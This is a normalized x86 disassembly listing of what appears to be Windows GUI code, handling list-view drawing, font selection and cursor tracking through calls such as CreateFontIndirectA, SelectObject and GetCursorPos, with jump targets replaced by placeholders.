mov eax [ ebx + 0x10 ]
call sub_439e90
mov [ ebp - 0xa ] al
xor esi esi
lea eax [ ebp - 0x10 ]
call sub_403f50
lea ecx [ ebp - 0x18 ]
xor edx edx
xor eax eax
call sub_405fd0
mov [ ebp - 0x19 ] 0x4
mov al [ ebp - 0xa ]
sub al 0x1
jb r-xdata
sub eax 0x2
je r-xdata
test eax 0x10002
je r-xdata
xor edx edx
push ebp
push sub_43a517
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebx + 0x10 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_425038
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_424ed8
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x170 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_424ef4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
mov edx [ eax + 0xc ]
mov ecx [ ebp - 0x4 ]
mov [ edx + 0xc ] ecx
mov [ edx + 0x8 ] sub_43bc98
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov [ eax + 0x8 ] sub_43bc98
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28a ] 0x0
cmp [ ebp - 0x1a ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x29c ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x20
mov cl 0x2
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x124 ]
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_424eb0
retn
lea edx [ ebp - 0x34 ]
mov cl 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x100 ]
jmp r-xdata
mov cl 0x2
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x124 ]
test al al
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
cmp [ ebx + 0x1c ] 0x8
jne r-xdata
cmp [ eax + 0x10 ] 0xffffffff
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43b440
mov eax [ eax + 0x14 ]
push eax
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43b440
pop edx
call sub_436ea0
jmp r-xdata
mov esi [ ebx + 0x18 ]
jmp r-xdata
sub al 0x2
jb r-xdata
mov eax [ ebp - 0x8 ]
lea edx [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_439d48
mov edi eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
lea ebx [ eax + 0xc ]
test [ ebx ] 0x1
je r-xdata
jmp r-xdata
test eax 0x10003
je r-xdata
cmp [ ebp - 0x1a ] 0x0
je r-xdata
push 0x0
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_439d48
mov edx eax
mov cx [ ebx + 0x28 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x104 ]
mov [ ebp - 0x9 ] al
mov ax [ ebx + 0x28 ]
push eax
push 0x0
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_439d48
mov edx eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov ecx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x108 ]
mov [ ebp - 0x9 ] al
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x29c ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x298 ]
push eax
call DeleteObject
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x298 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x29c ] edx
mov cl 0x3
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x124 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x10
mov cl 0x1
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x124 ]
test al al
je r-xdata
lea edx [ ebp - 0x34 ]
mov cl 0x2
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x100 ]
jmp r-xdata
mov cl 0x3
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x124 ]
test al al
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
test [ ebx + 0x18 ] 0x2
je r-xdata
lea edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov si 0xffad
call sub_403350
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push esi
mov eax [ ebx + 0xc ]
push eax
mov al [ ebp - 0x19 ]
push eax
test [ ebx + 0x10 ] 0x20
setne al
push eax
mov eax [ ebx + 0x10 ]
call sub_439e90
mov edx eax
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x118 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
mov edi [ ebx + 0x14 ]
test edi edi
je r-xdata
je r-xdata
test [ ebx ] 0x2
je r-xdata
mov esi [ ebx + 0x8 ]
test esi esi
jne r-xdata
test eax 0x10004
je r-xdata
cmp [ ebp - 0x1a ] 0x0
je r-xdata
push 0x1
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_439d48
mov edx eax
mov cx [ ebx + 0x28 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x104 ]
jmp r-xdata
mov ax [ ebx + 0x28 ]
push eax
push 0x1
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_439d48
mov edx eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov ecx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x108 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28a ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x4
call sub_4039b4
call sub_4039b4
jmp r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
xor ecx ecx
mov dl 0x2
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x124 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x40
lea edx [ ebp - 0x34 ]
mov cl 0x3
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x100 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
je r-xdata
test [ ebx + 0x18 ] 0x2
jne r-xdata
test [ ebx + 0x14 ] 0x2
jne r-xdata
lea eax [ ebp - 0x10 ]
call sub_403f50
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_408904
jmp r-xdata
mov eax [ ebx + 0x1c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebx + 0x20 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebx + 0x24 ]
sub eax 0x25
je r-xdata
jmp r-xdata
test [ ebx ] 0x10
je r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x24 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp esi eax
jg r-xdata
mov ecx [ ebx + 0x18 ]
dec ecx
mov edx [ edi + 0x24 ]
mov eax [ ebx + 0x14 ]
call sub_4087d4
jmp r-xdata
cmp [ ebp - 0x1a ] 0x0
je r-xdata
push 0x2
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_439d48
mov edx eax
mov cx [ ebx + 0x28 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x104 ]
jmp r-xdata
mov ax [ ebx + 0x28 ]
push eax
push 0x2
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_439d48
mov edx eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov ecx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x108 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a51e
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
xor edx edx
call sub_425038
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28a ] 0x0
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x210 ]
mov eax [ esi + 0xc ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] edx
mov eax [ esi + 0x14 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] edx
mov edi [ ebp - 0x8 ]
mov edi [ edi + 0x8 ]
mov eax [ esi + 0xc ]
mov eax [ eax + 0x18 ]
call sub_423b68
mov [ edi + 0x30 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
mov eax [ eax + 0x14 ]
call sub_4247ec
call sub_423b68
mov [ edi + 0x34 ] eax
lea eax [ ebp - 0x98 ]
push eax
push 0x3c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
mov eax [ eax + 0xc ]
call sub_42403c
push eax
call GetObjectA
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x20
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
test [ ebx + 0x14 ] 0x2
je r-xdata
push 0x0
mov ebx [ ebp - 0x4 ]
mov ecx edi
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x36c ]
call [ ebx + 0x368 ]
jmp r-xdata
mov [ ebp - 0x19 ] 0x0
jmp r-xdata
dec eax
je r-xdata
mov eax [ edi + 0x14 ]
mov [ ebx + 0x24 ] eax
jmp r-xdata
mov esi [ ebx + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_43b4cc
mov eax [ edi + 0x10 ]
mov [ ebx + 0x1c ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x220 ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ eax ] 0x0
lea ecx [ ebp - 0x9c ]
mov edx [ ebx + 0x8 ]
dec edx
mov eax [ ebp - 0x24 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov edx [ ebp - 0x9c ]
mov ecx [ ebx + 0x18 ]
dec ecx
mov eax [ ebx + 0x14 ]
call sub_4087d4
jmp r-xdata
push 0x3
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_439d48
mov edx eax
mov cx [ ebx + 0x28 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x104 ]
mov ax [ ebx + 0x28 ]
push eax
push 0x3
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_439d48
mov edx eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov ecx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x108 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
xor edx edx
call sub_425038
lea eax [ ebp - 0x98 ]
push eax
call CreateFontIndirectA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x298 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x298 ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call SelectObject
mov edx [ ebp - 0x4 ]
mov [ edx + 0x29c ] eax
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x2
push 0x1
mov ebx [ ebp - 0x4 ]
mov ecx edi
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x36c ]
call [ ebx + 0x368 ]
mov [ ebp - 0x19 ] 0x2
jmp r-xdata
dec eax
je r-xdata
mov eax [ edi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp esi eax
jge r-xdata
mov eax [ edi + 0x20 ]
inc eax
call sub_429e44
mov [ ebx + 0xc ] eax
mov [ ebx + 0x10 ] 0xf000
or [ ebx ] 0x8
jmp r-xdata
mov [ ebp - 0x19 ] 0x1
jmp r-xdata
dec eax
je r-xdata
mov edx [ ebx + 0x8 ]
dec edx
mov eax edi
call sub_437c38
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx + 0x8 ]
dec ecx
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_43bf60
mov eax [ ebp - 0x20 ]
mov [ ebx + 0x1c ] eax
mov [ ebp - 0x19 ] 0x3
jmp r-xdata
sub_43a51e
cmp [ ebp - 0x1a ] 0x0
jne r-xdata
mov cl 0x1
mov dl 0x2
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x124 ]
test al al
je r-xdata
xor ecx ecx
mov dl 0x2
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x124 ]
test al al
je r-xdata
mov cl 0x3
mov dl 0x2
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x124 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x10
mov cl 0x1
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x124 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x20
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_424eb0
retn
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x40
jmp r-xdata
mov cl 0x3
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x124 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x10
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x40
jmp r-xdata
sub_43abc0
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov ebp edx
mov ebx eax
test [ ebx + 0x98 ] 0x4
je r-xdata
mov ecx [ esp ]
mov edx ebp
mov eax ebx
call sub_450228
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x23c ]
call sub_4192f0
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
mov eax [ esp ]
push eax
push ebp
mov edx esi
mov eax [ ebx + 0x23c ]
call sub_437044
call sub_436e6c
push eax
call MulDiv
push eax
mov edx esi
mov eax [ ebx + 0x23c ]
call sub_437044
pop edx
call sub_436ea0
inc esi
dec edi
jne r-xdata
sub_43ac54
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ eax + 0x2e2 ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2e4 ]
call [ ebx + 0x2e0 ]
sub_43aca4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404400
xor eax eax
push ebp
push sub_43acfd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x22c ]
call sub_437d18
mov ebx eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4377b8
mov edx esi
mov eax ebx
call sub_437868
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ad04
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_43ad0c
push ebx
push ecx
mov [ esp ] 0x1
dec ecx
je r-xdata
xor ecx ecx
jmp r-xdata
dec ecx
je r-xdata
cmp [ eax + 0x2ca ] 0x0
je r-xdata
mov cl 0x1
jmp r-xdata
sub ecx 0x6
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push ecx
lea ecx [ esp + 0x4 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2cc ]
call [ ebx + 0x2c8 ]
mov cl 0x2
jmp r-xdata
sub_43ad54
push ebx
dec ecx
je r-xdata
xor ecx ecx
jmp r-xdata
dec ecx
je r-xdata
cmp [ eax + 0x2c2 ] 0x0
je r-xdata
mov cl 0x1
jmp r-xdata
sub ecx 0x6
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2c4 ]
call [ ebx + 0x2c0 ]
mov cl 0x2
jmp r-xdata
sub_43ad8c
push ebx
push esi
mov ebx edx
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x29 ] 0x0
jne r-xdata
cmp [ eax + 0x32a ] 0x0
je r-xdata
mov [ ebx + 0x29 ] 0x1
mov eax ebx
call sub_4376d4
mov esi eax
mov ecx ebx
mov edx eax
mov eax [ esi + 0x32c ]
call [ esi + 0x328 ]
sub_43adc4
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x342 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x344 ]
call [ ebx + 0x340 ]
sub_43adf0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43ae61
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x14 ]
call sub_404148
mov edx esi
mov eax ebx
call sub_439d48
mov esi eax
cmp [ ebx + 0x33a ] 0x0
je r-xdata
test esi esi
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x33c ]
call [ ebx + 0x338 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ae68
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4377b8
sub_43ae70
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xf0 ]
dec eax
jne r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x224 ]
pop ebx
retn
sub_43ae8c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ esi ]
cmp eax 0xf
je r-xdata
mov edi [ esi ]
cmp edi 0x201
je r-xdata
mov eax [ ebx + 0x22c ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
cmp eax 0x14
jne r-xdata
mov eax ebx
call sub_44a590
test al al
jne r-xdata
cmp edi 0x203
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_44e130
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_44e09c
test al al
jne r-xdata
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x14 ]
jmp r-xdata
sub_43af0a
add [ eax ] al
push ebx
push esi
add esp 0xffffffd8
mov ebx eax
mov eax ebx
call sub_44a604
xor eax eax
mov [ ebx + 0x270 ] eax
push esp
call GetCursorPos
lea ecx [ esp + 0x20 ]
mov edx esp
mov eax ebx
call sub_449964
mov eax [ esp + 0x20 ]
mov [ esp ] eax
mov eax [ esp + 0x24 ]
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x26c ]
cmp eax 0xffffffff
je r-xdata
xor esi esi
mov edx eax
mov eax [ ebx + 0x22c ]
call sub_437da4
mov esi eax
jmp r-xdata
test esi esi
je r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebx
call sub_43b628
mov esi eax
mov [ ebx + 0x26c ] 0xffffffff
test esi esi
jne r-xdata
add esp 0x28
pop esi
pop ebx
retn
mov eax esi
call sub_437bec
push eax
mov eax ebx
call sub_45071c
lea ecx [ esp + 0xc ]
pop edx
call sub_42a004
test eax eax
je r-xdata
mov ebx [ ebx + 0x224 ]
mov edx eax
mov eax ebx
call sub_456f64
lea ecx [ esp + 0x10 ]
xor edx edx
mov eax esi
call sub_437c08
mov eax [ esp + 0x4 ]
sub eax [ esp + 0x14 ]
push eax
mov ecx [ esp + 0x4 ]
sub ecx [ esp + 0x14 ]
xor edx edx
mov eax ebx
call sub_452170
sub_43afe0
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_44a624
mov eax [ ebx + 0x224 ]
call sub_452358
xor eax eax
mov [ ebx + 0x270 ] eax
pop ebx
pop ebp
retn 0x4
sub_43b00c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44fdd4
mov edi [ esi + 0x8 ]
mov al [ esi + 0x4 ]
dec al
je r-xdata
mov eax [ edi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x18 ]
mov eax ebx
call sub_43b464
mov [ ebx + 0x270 ] eax
xor edx edx
mov eax ebx
call sub_43b488
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ edi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
jmp r-xdata
dec al
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx edi
mov eax ebx
call sub_449964
mov eax [ esp + 0x4 ]
push eax
cmp [ esi + 0xc ] 0x0
setne al
push eax
mov edx [ edi + 0x8 ]
mov ecx [ esp + 0x8 ]
mov eax ebx
call sub_43b140
jmp r-xdata
dec al
je r-xdata
xor eax eax
mov [ ebx + 0x270 ] eax
cmp [ ebx + 0x244 ] 0x0
je r-xdata
jmp r-xdata
mov al [ ebx + 0x215 ]
sub al 0x2
jae r-xdata
mov eax ebx
call sub_43b264
mov esi eax
lea ecx [ esp + 0x8 ]
xor edx edx
xor eax eax
call sub_405fd0
lea edx [ esp + 0x8 ]
mov cl 0x4
mov eax ebx
call sub_43b5c0
mov esi eax
jmp r-xdata
mov eax esi
call sub_437bec
push eax
mov eax [ ebx + 0x22c ]
call sub_437d74
mov edi eax
dec edi
pop eax
sub edi eax
jl r-xdata
test esi esi
je r-xdata
inc edi
mov esi eax
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x22c ]
call sub_437da4
xor ecx ecx
mov edx 0x1
call sub_437900
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x22c ]
call sub_437da4
mov edx 0x1
call sub_437898
test al al
je r-xdata
sub_43b140
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
mov edx ecx
mov eax esi
mov ecx [ ebp + 0xc ]
call sub_43b628
mov ebx eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax esi
call sub_43b464
mov edi eax
cmp edi ebx
jne r-xdata
xor eax eax
mov [ esi + 0x270 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x88 ]
test edi edi
je r-xdata
cmp ebx [ esi + 0x270 ]
jne r-xdata
mov cl [ ebp + 0x8 ]
mov edx 0x1
mov eax ebx
call sub_437900
mov eax esi
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor ecx ecx
mov edx 0x1
mov eax edi
call sub_437900
sub_43b1e4
push ebx
mov ebx eax
mov eax ebx
call sub_450a20
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_45071c
mov edx sub_43875c
xor ecx ecx
call sub_42a174
cmp eax 0x1
sbb eax eax
inc eax
pop ebx
retn
sub_43b214
cmp dl [ eax + 0x229 ]
je r-xdata
retn
mov [ eax + 0x229 ] dl
mov dl [ eax + 0x229 ]
mov ecx edx
sub cl 0x1
je r-xdata
cmp [ eax + 0x2ea ] 0x0
jne r-xdata
sub cl 0x2
jne r-xdata
call sub_43b1e4
add dl 0xfe
sub dl 0x2
jae r-xdata
sub_43b264
push ebx
push esi
mov ebx eax
xor esi esi
mov al [ ebx + 0x215 ]
sub al 0x2
jb r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_45071c
call sub_42a050
cmp eax 0xffffffff
je r-xdata
mov edx eax
mov eax [ ebx + 0x22c ]
call sub_437da4
mov esi eax
sub_43b29c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x218 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x218 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x27c ]
call sub_457920
xor ecx ecx
xor edx edx
mov eax ebx
call sub_438ef4
mov edx [ ebx + 0x27c ]
call sub_457964
mov edx ebx
mov eax [ ebx + 0x218 ]
call sub_42109c
mov eax [ ebx + 0x218 ]
call sub_456f90
mov edx eax
xor ecx ecx
mov eax ebx
call sub_438ef4
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43b30c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x21c ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x21c ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x280 ]
call sub_457920
mov ecx 0x1
xor edx edx
mov eax ebx
call sub_438ef4
mov edx [ ebx + 0x280 ]
call sub_457964
mov edx ebx
mov eax [ ebx + 0x21c ]
call sub_42109c
mov eax [ ebx + 0x21c ]
call sub_456f90
mov edx eax
mov ecx 0x1
mov eax ebx
call sub_438ef4
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43b384
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x220 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov [ ebx + 0x220 ] esi
cmp [ ebx + 0x274 ] 0x0
je r-xdata
mov edx [ ebx + 0x284 ]
call sub_457920
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
mov eax ebx
call sub_4394e0
mov ecx 0x2
xor edx edx
mov eax ebx
call sub_438ef4
cmp [ ebx + 0x274 ] 0x0
je r-xdata
mov edx [ ebx + 0x284 ]
call sub_457964
mov edx ebx
mov eax [ ebx + 0x220 ]
call sub_42109c
mov eax [ ebx + 0x220 ]
call sub_456f90
mov edx eax
mov ecx 0x2
mov eax ebx
call sub_438ef4
cmp [ ebx + 0x274 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
xor edx edx
mov eax ebx
call sub_439564
mov dl 0x1
mov eax ebx
call sub_439564
mov eax ebx
call sub_439454
jmp r-xdata
sub_43b464
push ebx
mov ebx eax
mov al [ r-xdata ]
push eax
mov cl 0x4
xor edx edx
mov eax ebx
call sub_43b4ec
test eax eax
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x270 ]
sub_43b488
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_450a20
test al al
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov eax ebx
call sub_43b464
mov esi eax
test esi esi
je r-xdata
mov cl 0x1
mov edx 0x1
mov eax esi
call sub_437900
jmp r-xdata
xor ecx ecx
mov edx 0x1
mov eax esi
call sub_437900
sub_43b4ec
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov edi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_450a20
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
xor esi esi
xor eax eax
mov al [ ebp - 0x1 ]
cmp eax 0x4
ja r-xdata
test edi edi
je r-xdata
jmp [ eax * 4 + jump_table_43b523 ]
or edi 0xffffffff
mov eax edi
call sub_437bec
mov edi eax
jmp r-xdata
mov esi 0x100
jmp r-xdata
mov esi 0x200
jmp r-xdata
mov esi 0x400
jmp r-xdata
mov esi 0x800
jmp r-xdata
xor esi esi
test [ ebp + 0x8 ] 0x4
je r-xdata
or esi 0x4
test [ ebp + 0x8 ] 0x2
je r-xdata
test [ ebp + 0x8 ] 0x8
je r-xdata
or esi 0x8
test [ ebp + 0x8 ] 0x10
je r-xdata
or esi 0x1
mov eax ebx
call sub_45071c
mov ecx esi
mov edx edi
call sub_429ebc
mov edi eax
cmp edi 0xffffffff
je r-xdata
